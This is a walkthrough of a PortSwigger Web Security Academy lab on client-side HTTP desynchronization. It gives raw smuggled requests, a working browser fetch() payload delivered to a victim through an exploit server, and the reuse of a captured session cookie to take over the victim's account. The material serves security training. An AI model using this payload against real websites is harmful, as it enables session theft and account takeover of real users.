# Client-Side Desynchronization


## Overview



Client-side desynchronization occurs when a browser and a web server disagree about the boundaries of HTTP 
requests. This can allow an attacker to influence how a subsequent request is interpreted.



## Lab Attack Chain



```text

Desync Vector

     ↓

Exploitable Gadget

     ↓

Browser Replication

     ↓

Deliver to Victim

     ↓

Capture Victim Request

     ↓

Session Cookie Exposure

```




### 1. Confirm the Desync



Send a request containing another HTTP request in its body:



```http

POST / HTTP/1.1

Host: YOUR-LAB-ID.h1-web-security-academy.net

Connection: keep-alive

Content-Length: 34



GET /hopefully404 HTTP/1.1

Foo: x

```



If `/hopefully404` is processed separately and returns `404`, the desync vector is confirmed.



---



### 2. Identify an Exploitable Gadget



The lab's comment endpoint can be used as a gadget:



```http

POST /en/post/comment HTTP/1.1

Host: YOUR-LAB-ID.h1-web-security-academy.net

Content-Length: 133

Content-Type: application/x-www-form-urlencoded

Connection: keep-alive



csrf=YOUR-CSRF-TOKEN&postId=3&name=ai&email=ais%40fg.gmali&website=https%3A%2F%2Fyougli.com&comment=

```



Follow it with:



```http

GET /capture-me HTTP/1.1

Host: YOUR-LAB-ID.h1-web-security-academy.net

```



If the comment contains:



```text

GET /capture-me

```


the gadget is working.

---


### 3. Replicate in the Browser



Use `fetch()` with the desync payload:



```javascript

fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {

    method: 'POST',

    body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: 
    session=YOUR-SESSION; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: 133\r\nContent-Type: application/
    x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=3&name=ai&email=ais%40fg.
    gmali&website=https%3A%2F%2Fyougli.com&comment=',
    
    mode: 'cors',
    
    credentials: 'include'

}).catch(() => {



    fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {



        mode: 'no-cors',



        credentials: 'include'



    })

})

```



The CORS error is intentional. It prevents the redirect from being followed normally and allows the `catch()` block 

to continue the sequence.



---



### 4. Deliver to the Victim



Place the JavaScript inside:



```html

<script>

    // fetch() payload

</script>

```



in the Exploit Server, then:



```text

Store → Deliver to victim

```



A request containing:



```http

User-Agent: ... (Victim)

```



confirms that the request originated from the victim's browser.



---


### 5. Capture Sensitive Request Data



Adjust the **nested** `Content-Length` until enough of the victim's request is captured to expose the relevant 
session information.



The important distinction is:



```text

Outer Content-Length

        ≠

Nested Content-Length

```



The nested value controls how much data is consumed by the comment request.



---



### 6. Use the Captured Session



Once the lab exposes the victim's session value, use it in Burp Repeater:



```http

GET /my-account HTTP/1.1

Host: YOUR-LAB-ID.h1-web-security-academy.net

Cookie: session=VICTIM-SESSION

Connection: close

```



Successful access to `/my-account` completes the lab.



## Key Takeaways



* **Desync vector:** disagreement about HTTP request boundaries.

* **Gadget:** an application feature that turns the desync into a useful effect.

* **Comment endpoint:** used as the exploitable gadget in this lab.

* **`fetch()` + CORS:** demonstrates browser-based exploitation.

* **Nested `Content-Length`:** controls how much of the following request is captured.

* **Victim User-Agent:** confirms the request came from the victim browser.

* **Final impact:** sensitive session information can be exposed through the vulnerable gadget.



**Source:** [PortSwigger Web Security Academy — Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync?utm_source=chatgpt.com)
